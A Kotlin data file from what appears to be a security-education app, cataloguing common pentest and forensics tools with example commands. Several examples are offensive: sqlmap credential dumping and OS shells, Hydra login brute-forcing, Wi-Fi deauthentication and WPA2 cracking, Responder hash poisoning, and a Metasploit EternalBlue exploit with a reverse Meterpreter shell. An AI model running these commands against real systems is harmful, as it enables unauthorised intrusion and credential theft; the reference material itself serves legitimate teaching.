package com.example.data.repository

import com.example.data.model.Difficulty
import com.example.data.model.RiskLevel
import com.example.data.model.SecurityTool
import com.example.data.model.ToolCategory
import com.example.data.model.ToolExample

object SecurityToolsDataSource {
    fun getTools(): List<SecurityTool> = listOf(
        // 1. RECON & OSINT
        SecurityTool(
            id = "nmap",
            name = "Nmap Network Scanner",
            category = ToolCategory.RECON,
            description = "Industry standard network discovery, port scanning, and vulnerability detection utility.",
            syntax = "nmap [Scan Type...] [Options] {target specification}",
            riskLevel = RiskLevel.MEDIUM,
            difficulty = Difficulty.BEGINNER,
            examples = listOf(
                ToolExample("Fast SYN Stealth Scan", "nmap -sS -T4 192.168.1.100", "Performs half-open TCP SYN scan with aggressive timing."),
                ToolExample("Version & OS Detection", "nmap -sV -O -p 1-1000 192.168.1.100", "Probes services for exact versions and fingerprints OS stack."),
                ToolExample("NSE Vulnerability Audit", "nmap --script vuln 192.168.1.100", "Runs all standard NSE vulnerability auditing scripts against target."),
                ToolExample("All Ports Full Audit", "nmap -p- -A -T4 10.10.10.25", "Aggressive scan across all 65535 TCP ports with traceroute & scripts."),
                ToolExample("Firewall Evasion (Fragment)", "nmap -f -D RND:5 192.168.1.1", "Fragments packets and spoofs decoys to evade perimeter firewalls.")
            )
        ),
        SecurityTool(
            id = "masscan",
            name = "Masscan IP Port Scanner",
            category = ToolCategory.RECON,
            description = "Asynchronous TCP port scanner capable of scanning the entire Internet in under 6 minutes.",
            syntax = "masscan -p<ports> <ip/range> --rate=<rate>",
            riskLevel = RiskLevel.HIGH,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Subnet Fast Port 80/443", "masscan -p80,443 10.0.0.0/24 --rate=1000", "Scans entire class C subnet for web services at 1000 pps."),
                ToolExample("Top 1000 Ports", "masscan --top-ports 1000 192.168.1.0/24 --rate=5000", "High speed sweep of standard ports on local network."),
                ToolExample("Scan All Ports Single IP", "masscan -p0-65535 10.10.10.5 --rate=10000", "Full port scan in under 3 seconds."),
                ToolExample("Banner Grabbing", "masscan -p80,8080 10.0.0.0/16 --banners", "Grabs application banners from active services."),
                ToolExample("Interface Selection", "masscan -p22 192.168.1.0/24 -e eth0", "Directs scanner through specific Ethernet interface.")
            )
        ),
        SecurityTool(
            id = "amass",
            name = "OWASP Amass",
            category = ToolCategory.RECON,
            description = "In-depth DNS enumeration, network mapping, and external asset discovery framework.",
            syntax = "amass enum [options] -d <domain>",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Passive Subdomain Enum", "amass enum -passive -d corp.example.com", "Gathers subdomains from passive OSINT sources without touching target."),
                ToolExample("Active DNS Brute-force", "amass enum -active -brute -d corp.example.com", "Actively resolves subdomains using wordlist dictionary."),
                ToolExample("ASN & CIDR Mapping", "amass intel -asn 13335", "Maps all network ranges and domains registered to an ASN."),
                ToolExample("Visual Graph Output", "amass viz -d3 -d example.com", "Generates D3.js interactive asset graph representation."),
                ToolExample("Track Changes Over Time", "amass track -d example.com", "Compares recent scans against historic database to find new subdomains.")
            )
        ),
        SecurityTool(
            id = "sherlock",
            name = "Sherlock OSINT",
            category = ToolCategory.RECON,
            description = "Hunt down social media accounts by username across 300+ social networks.",
            syntax = "sherlock <username> [options]",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.BEGINNER,
            examples = listOf(
                ToolExample("Target Username Footprint", "sherlock target_hacker_0x", "Searches for username existence across 300+ platforms."),
                ToolExample("Only Positive Matches", "sherlock johndoe --print-found", "Filters console output to only display verified active profiles."),
                ToolExample("Export to CSV", "sherlock cybersec_expert --csv", "Saves structured investigation results into a CSV spreadsheet."),
                ToolExample("Through Tor Proxy", "sherlock anonym_user --tor", "Anonymizes API requests through the local Tor SOCKS proxy."),
                ToolExample("Specific Network Filter", "sherlock user99 --site github,twitter,reddit", "Restricts scan to prioritized platform targets.")
            )
        ),
        SecurityTool(
            id = "theharvester",
            name = "theHarvester OSINT",
            category = ToolCategory.RECON,
            description = "Gathers emails, names, subdomains, IPs, and URLs using public sources and search engines.",
            syntax = "theHarvester -d <domain> -l <limit> -b <source>",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.BEGINNER,
            examples = listOf(
                ToolExample("Domain Email Harvest", "theHarvester -d megacorp.com -l 500 -b google,bing", "Scrapes emails and public employee names from search indexes."),
                ToolExample("All Sources Recon", "theHarvester -d target.org -b all", "Queries all search engines, LinkedIn, Shodan, and DNS certs."),
                ToolExample("Shodan Integration", "theHarvester -d target.org -b shodan", "Queries Shodan database for indexed hosts and vulnerabilities."),
                ToolExample("DNS Brute-forcing", "theHarvester -d target.org -c", "Runs virtual host and subdomain brute force verification."),
                ToolExample("HTML Report Export", "theHarvester -d target.org -b all -f target_report.html", "Exports findings into an HTML reconnaissance executive summary.")
            )
        ),

        // 2. WEB APPLICATION PENTESTING
        SecurityTool(
            id = "sqlmap",
            name = "Sqlmap SQLi Exploiter",
            category = ToolCategory.WEB_APP,
            description = "Automatic SQL injection and database takeover tool supporting all major DBMS engines.",
            syntax = "sqlmap -u <url> [options]",
            riskLevel = RiskLevel.CRITICAL,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Automated Vulnerability Test", "sqlmap -u \"http://10.10.10.5/item.php?id=1\" --batch", "Detects injectable GET parameters automatically without prompts."),
                ToolExample("Enumerate Databases", "sqlmap -u \"http://target.corp/login.php?u=admin\" --dbs", "Extracts database schema names from compromised SQL backend."),
                ToolExample("Dump Tables & Credentials", "sqlmap -u \"http://target.corp/vuln.php?id=1\" -D users_db -T accounts --dump", "Dumps all columns and password hashes from specific table."),
                ToolExample("OS Command Shell Spawn", "sqlmap -u \"http://target.corp/app.php?id=1\" --os-shell", "Attempts to escalate SQL execution privileges to interactive OS shell."),
                ToolExample("Bypass WAF with Tamper", "sqlmap -u \"http://target.corp/search?q=test\" --tamper=between,randomcase", "Applies tamper scripts to evade Web Application Firewall filters.")
            )
        ),
        SecurityTool(
            id = "nikto",
            name = "Nikto Web Vulnerability Scanner",
            category = ToolCategory.WEB_APP,
            description = "Comprehensive web server scanner testing for 6700+ dangerous files, outdated servers, and misconfigurations.",
            syntax = "nikto -h <host/url> [options]",
            riskLevel = RiskLevel.MEDIUM,
            difficulty = Difficulty.BEGINNER,
            examples = listOf(
                ToolExample("Standard Web Server Scan", "nikto -h 192.168.1.100", "Scans default HTTP port 80 for dangerous scripts and config flaws."),
                ToolExample("SSL / HTTPS Audit", "nikto -h https://target.corp -ssl", "Forces TLS connection and inspects SSL certificate headers."),
                ToolExample("Custom Port & Tuning", "nikto -h 192.168.1.100 -p 8080 -Tuning 1,2,3", "Tuning scan for injection, misconfigurations, and information leakage."),
                ToolExample("HTTP Authentication Scan", "nikto -h http://admin.corp -id admin:password123", "Supplies HTTP Basic Auth credentials to scan protected areas."),
                ToolExample("Proxy Routing (Burp)", "nikto -h http://target.corp -useproxy http://127.0.0.1:8080", "Routes scan traffic through intercepting proxy for review.")
            )
        ),
        SecurityTool(
            id = "gobuster",
            name = "Gobuster Directory Bruter",
            category = ToolCategory.WEB_APP,
            description = "High performance URI directory, DNS subdomain, and virtual host brute-forcing tool written in Go.",
            syntax = "gobuster dir -u <url> -w <wordlist> [options]",
            riskLevel = RiskLevel.MEDIUM,
            difficulty = Difficulty.BEGINNER,
            examples = listOf(
                ToolExample("Directory Brute Force", "gobuster dir -u http://10.10.10.50/ -w /usr/share/wordlists/common.txt", "Discovers hidden routes and API endpoints on web servers."),
                ToolExample("Extension Matching", "gobuster dir -u http://target.corp/ -w common.txt -x php,html,txt,bak", "Searches for specific file extensions and sensitive backups."),
                ToolExample("DNS Subdomain Bruting", "gobuster dns -d target.corp -w subdomains.txt -t 50", "Multi-threaded DNS subdomain enumeration."),
                ToolExample("Virtual Host Discovery", "gobuster vhost -u http://target.corp -w vhosts.txt", "Fuzzes HTTP Host header to locate unlinked internal Virtual Hosts."),
                ToolExample("Status Code Filtering", "gobuster dir -u http://target.corp -w wordlist.txt -s \"200,204,301,302,307\"", "Only reports successful or redirect HTTP response status codes.")
            )
        ),
        SecurityTool(
            id = "burpsuite",
            name = "Burp Suite Proxy & Interceptor",
            category = ToolCategory.WEB_APP,
            description = "Leading application security testing software with intercepting HTTP proxy, repeater, and intruder.",
            syntax = "burpsuite & (GUI based framework)",
            riskLevel = RiskLevel.HIGH,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Start Intercept Proxy", "127.0.0.1:8080 (Configure Browser Proxy)", "Intercepts HTTP/HTTPS requests in real-time for live tampering."),
                ToolExample("Repeater Request Fuzzing", "Right click request -> Send to Repeater", "Modifies headers, cookies, and payloads with instant response feedback."),
                ToolExample("Intruder Sniper Attack", "Configure §payload§ markers in Intruder", "Automates parameter fuzzing with wordlists for brute force and IDOR."),
                ToolExample("Match and Replace Rules", "Proxy -> Options -> Match and Replace", "Automatically swaps headers or auth tokens on outgoing requests."),
                ToolExample("Decoder Utility", "Convert URL / Base64 / Hex / SHA1", "Instant interactive decoding and hashing of intercepted parameters.")
            )
        ),
        SecurityTool(
            id = "nuclei",
            name = "Nuclei Template Scanner",
            category = ToolCategory.WEB_APP,
            description = "Fast and customizable vulnerability scanner based on community-driven YAML templates.",
            syntax = "nuclei -u <target> -t <templates>",
            riskLevel = RiskLevel.HIGH,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Scan All Critical Vulnerabilities", "nuclei -u https://target.corp -severity critical,high", "Tests target against all known CVEs and high-severity templates."),
                ToolExample("Specific CVE Check", "nuclei -u https://target.corp -t cves/2024/", "Runs all CVE templates released in year 2024 against domain."),
                ToolExample("Exposed Panels & Tokens", "nuclei -u https://target.corp -t exposed-panels/,tokens/", "Checks for leaked API keys, Git repositories, and admin portals."),
                ToolExample("Subdomain Target List", "nuclei -l subdomains.txt -t default-logins/", "Tests bulk host list for default admin/root credentials."),
                ToolExample("Custom Rate Limiting", "nuclei -u https://target.corp -c 50 -rl 150", "Throttles requests to 150/s to avoid triggering WAF blocking.")
            )
        ),

        // 3. NETWORK & WIRELESS
        SecurityTool(
            id = "wireshark",
            name = "Wireshark / TShark Packet Analyzer",
            category = ToolCategory.NETWORK,
            description = "World's foremost network packet analysis and deep packet inspection framework.",
            syntax = "tshark -i <interface> [filters]",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Capture Live Interface", "tshark -i eth0 -w capture.pcap", "Captures raw packets from primary Ethernet interface to PCAP file."),
                ToolExample("Filter HTTP GET Requests", "tshark -r capture.pcap -Y \"http.request.method == GET\"", "Filters saved capture for plaintext HTTP web requests."),
                ToolExample("Extract Plaintext Passwords", "tshark -r capture.pcap -Y \"http contains password\"", "Inspects packet payload strings for cleartext credentials."),
                ToolExample("DNS Query Forensics", "tshark -r traffic.pcap -T fields -e dns.qry.name", "Extracts all DNS domain name resolution lookups from network capture."),
                ToolExample("Follow TCP Stream", "tshark -r stream.pcap -z follow,tcp,ascii,0", "Reconstructs complete bidirectional TCP conversation flow.")
            )
        ),
        SecurityTool(
            id = "aircrack",
            name = "Aircrack-ng Wireless Suite",
            category = ToolCategory.NETWORK,
            description = "Complete suite of tools to assess Wi-Fi network security, capture 4-way handshakes, and crack WPA2 keys.",
            syntax = "aircrack-ng [options] <capture-file>",
            riskLevel = RiskLevel.HIGH,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Enable Monitor Mode", "airmon-ng start wlan0", "Switches Wi-Fi interface into promiscuous monitor mode."),
                ToolExample("Packet Capture Beacon Sweep", "airodump-ng wlan0mon", "Displays all active 802.11 BSSIDs, channels, and client associations."),
                ToolExample("Targeted Handshake Capture", "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_handshake wlan0mon", "Locks onto target AP to capture 4-way WPA2 handshake packets."),
                ToolExample("Deauthentication Attack", "aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon", "Forces client disconnect to trigger immediate re-authentication."),
                ToolExample("WPA2 Handshake Cracking", "aircrack-ng -w wordlist.txt wpa_handshake-01.cap", "Brute-forces pre-shared PMK hash against wordlist dictionary.")
            )
        ),
        SecurityTool(
            id = "responder",
            name = "Responder LLMNR / NBT-NS Poisoner",
            category = ToolCategory.NETWORK,
            description = "LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers to capture NetNTLM hashes.",
            syntax = "responder -I <interface> [options]",
            riskLevel = RiskLevel.CRITICAL,
            difficulty = Difficulty.ADVANCED,
            examples = listOf(
                ToolExample("Start Poisoning Interface", "responder -I eth0 -rdw", "Listens for broadcast name queries and responds with rogue server IP."),
                ToolExample("Analyze Mode (Passive)", "responder -I eth0 -A", "Monitors network for name resolution traffic without sending poison responses."),
                ToolExample("Capture NetNTLMv2 Hashes", "responder -I eth0 -v", "Dumps intercepted Windows authentication hashes to log file for cracking."),
                ToolExample("WPAD Rogue Proxy Injection", "responder -I eth0 -w -F", "Hosts malicious WPAD pac file to proxy domain web traffic."),
                ToolExample("Custom DHCP Rogue Server", "responder -I eth0 --dhcp", "Responds to DHCP broadcasts to inject rogue DNS servers.")
            )
        ),

        // 4. EXPLOITATION & PAYLOADS
        SecurityTool(
            id = "hydra",
            name = "THC-Hydra Network Cracker",
            category = ToolCategory.EXPLOITATION,
            description = "Very fast network logon cracker supporting 50+ protocols (SSH, FTP, HTTP, RDP, SMB, MySQL).",
            syntax = "hydra -l <user> -P <passlist> <target> <service>",
            riskLevel = RiskLevel.CRITICAL,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("SSH Dictionary Attack", "hydra -l root -P /usr/share/wordlists/passwords.txt 192.168.1.50 ssh", "Brute-forces SSH root login using multi-threaded connections."),
                ToolExample("FTP User & Pass Lists", "hydra -L users.txt -P rockyou.txt 10.10.10.20 ftp", "Tests combinations of username list against password dictionary."),
                ToolExample("HTTP Form POST Login", "hydra 10.10.10.5 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Login failed\"", "Cracks web login form by identifying failure text pattern."),
                ToolExample("RDP Windows Remote Desktop", "hydra -l Administrator -P pass.txt rdp://192.168.1.200 -t 4", "Tests RDP remote desktop credentials with 4 parallel threads."),
                ToolExample("MySQL Database Login", "hydra -l root -P passwords.txt 10.10.10.10 mysql", "Attacks MySQL database management server port 3306.")
            )
        ),
        SecurityTool(
            id = "john",
            name = "John the Ripper (JtR)",
            category = ToolCategory.EXPLOITATION,
            description = "Fast password cracker designed to detect weak Unix, Windows NTLM, Kerberos, and archive passwords.",
            syntax = "john [options] [password-files]",
            riskLevel = RiskLevel.HIGH,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Crack Linux /etc/shadow", "john --wordlist=rockyou.txt shadow_hashes.txt", "Cracks SHA-512 crypt Unix password hashes using dictionary."),
                ToolExample("Crack Windows NTLM Hashes", "john --format=NT --wordlist=rockyou.txt ntlm_dump.txt", "High-speed cracking of Windows SAM / NT password hashes."),
                ToolExample("ZIP Archive Password", "zip2john protected.zip > hash.txt && john hash.txt", "Extracts PKZIP encryption header and recovers zip password."),
                ToolExample("SSH Private Key Passphrase", "ssh2john id_rsa > id_rsa.hash && john id_rsa.hash", "Extracts encrypted private key passphrase hash and cracks it."),
                ToolExample("Incremental Brute-Force", "john --incremental:digits hashes.txt", "Systematically tests all numeric combinations without a dictionary.")
            )
        ),
        SecurityTool(
            id = "hashcat",
            name = "Hashcat GPU Password Recovery",
            category = ToolCategory.EXPLOITATION,
            description = "World's fastest and most advanced GPU-accelerated password recovery engine.",
            syntax = "hashcat -m <mode> -a <type> <hashfile> <wordlist>",
            riskLevel = RiskLevel.HIGH,
            difficulty = Difficulty.ADVANCED,
            examples = listOf(
                ToolExample("Crack MD5 Hashes (-m 0)", "hashcat -m 0 -a 0 hashes.txt rockyou.txt", "Utilizes GPU acceleration to crack raw MD5 hashes."),
                ToolExample("Crack NTLM Hashes (-m 1000)", "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule", "Cracks NTLM hashes applying mutation rules to dictionary."),
                ToolExample("WPA/WPA2 PMKID Crack (-m 22000)", "hashcat -m 22000 -a 0 pmkid_capture.hc22000 wordlist.txt", "Recovers Wi-Fi pre-shared key from captured PMKID packet."),
                ToolExample("Bcrypt Hashes (-m 3200)", "hashcat -m 3200 -a 0 bcrypt_hashes.txt wordlist.txt", "Cracks UNIX bcrypt password hashes with GPU optimization."),
                ToolExample("Mask Attack (Custom Charset)", "hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?d?d?d?s", "Tests password pattern: 1 Upper, 3 Lower, 3 Digits, 1 Special.")
            )
        ),
        SecurityTool(
            id = "metasploit",
            name = "Metasploit Framework (MSF)",
            category = ToolCategory.EXPLOITATION,
            description = "Premier penetration testing platform with 2000+ public exploits, payloads, and post-exploitation modules.",
            syntax = "msfconsole [options]",
            riskLevel = RiskLevel.CRITICAL,
            difficulty = Difficulty.ADVANCED,
            examples = listOf(
                ToolExample("Launch Console", "msfconsole -q", "Opens Metasploit command interface quietly without banner."),
                ToolExample("Search Exploit Database", "search cve:2024 type:exploit platform:windows", "Queries local MSF database for relevant vulnerability modules."),
                ToolExample("Configure Module", "use exploit/windows/smb/ms17_010_eternalblue && set RHOSTS 10.10.10.5", "Selects exploit and targets remote SMB endpoint."),
                ToolExample("Set Reverse TCP Payload", "set PAYLOAD windows/x64/meterpreter/reverse_tcp && set LHOST 10.10.14.2", "Stages Meterpreter interactive shell payload."),
                ToolExample("Execute Exploit", "exploit -j", "Triggers attack payload execution in background job.")
            )
        ),

        // 5. CLOUD & DEVSECOPS
        SecurityTool(
            id = "prowler",
            name = "Prowler Cloud Security Audit",
            category = ToolCategory.CLOUD_DEVSECOPS,
            description = "Open-source security assessment, auditing, and compliance tool for AWS, Azure, GCP, and Kubernetes.",
            syntax = "prowler [provider] [options]",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("AWS CIS Benchmark Audit", "prowler aws --compliance cis_2.0_aws", "Audits entire AWS tenant against CIS Foundation security benchmarks."),
                ToolExample("Check S3 Bucket Exposures", "prowler aws --services s3 --severity critical", "Identifies publicly accessible S3 storage buckets and unencrypted data."),
                ToolExample("GCP Security Health Audit", "prowler gcp --project-id my-cloud-prod-01", "Assesses Google Cloud Platform IAM, VPC firewalls, and GKE cluster."),
                ToolExample("Azure Entra ID / RBAC Check", "prowler azure --services entra,storage", "Validates Microsoft Entra ID privilege escalation risks."),
                ToolExample("Generate Executive JSON Report", "prowler aws -M json,csv,html -F /tmp/prowler_report", "Exports audit metrics into structured compliance reports.")
            )
        ),
        SecurityTool(
            id = "trivy",
            name = "Trivy Container & Artifact Scanner",
            category = ToolCategory.CLOUD_DEVSECOPS,
            description = "Comprehensive scanner for container images, Git repositories, Kubernetes configurations, and IaC files.",
            syntax = "trivy [command] [target]",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.BEGINNER,
            examples = listOf(
                ToolExample("Scan Docker Image for CVEs", "trivy image nginx:latest", "Scans container base OS packages and application dependencies for CVEs."),
                ToolExample("Scan Git Repository", "trivy repo https://github.com/my-org/backend-service", "Audits source code dependencies, lockfiles, and embedded secrets."),
                ToolExample("IaC Terraform / K8s Misconfig", "trivy config ./terraform-infra/", "Identifies insecure cloud configurations before deployment."),
                ToolExample("Severity Filter", "trivy image --severity CRITICAL,HIGH my-app:v1.2", "Filters container scan to only output actionable high/critical flaws."),
                ToolExample("SBOM Generation (SPDX)", "trivy image --format spdx-json --output sbom.json alpine:3.19", "Generates software bill of materials compliance document.")
            )
        ),

        // 6. FORENSICS & INCIDENT RESPONSE
        SecurityTool(
            id = "volatility",
            name = "Volatility Memory Forensics",
            category = ToolCategory.FORENSICS,
            description = "World's most widely used advanced memory artifact analysis framework for incident responders.",
            syntax = "vol -f <memory.raw> [plugin]",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.ADVANCED,
            examples = listOf(
                ToolExample("List Process Tree (pslist)", "vol -f memdump.raw windows.pslist", "Extracts active and hidden process hierarchies from RAM dump."),
                ToolExample("Network Connection State", "vol -f memdump.raw windows.netscan", "Discovers established C2 network connections active at dump time."),
                ToolExample("Detect Code Injection (malfind)", "vol -f memdump.raw windows.malfind", "Scans process memory pages with RWX permissions for injected shellcode."),
                ToolExample("Dump Injected Process DLL", "vol -f memdump.raw windows.dumpfiles --pid 1420", "Extracts malicious PE executable binaries from memory for static analysis."),
                ToolExample("Command Line History", "vol -f memdump.raw windows.cmdline", "Recovers executed console commands and PowerShell script parameters.")
            )
        ),
        SecurityTool(
            id = "yara",
            name = "YARA Pattern Matching Swiss Army Knife",
            category = ToolCategory.FORENSICS,
            description = "Pattern matching engine helping malware researchers identify and classify malware samples.",
            syntax = "yara [options] <rules_file> <target_directory>",
            riskLevel = RiskLevel.LOW,
            difficulty = Difficulty.INTERMEDIATE,
            examples = listOf(
                ToolExample("Scan Directory with Rules", "yara -r malware_rules.yar /var/www/uploads/", "Recursively scans folder for webshells and suspicious byte patterns."),
                ToolExample("Scan Live Process Memory", "yara rules.yar 4582 (PID)", "Scans memory address space of running process for threat signatures."),
                ToolExample("Print Matching Strings", "yara -s webshell_detector.yar suspicious_file.php", "Displays exact byte offsets and matched string variables."),
                ToolExample("Fast Scan Mode", "yara -f -r ransomware.yar /mnt/forensic_drive/", "Optimizes scan execution time on massive disk images."),
                ToolExample("Compiled Rule Verification", "yarac rules.yar compiled.yarc && yara -C compiled.yarc sample.exe", "Compiles YARA rules to binary bytecode for high throughput.")
            )
        )
    )
}
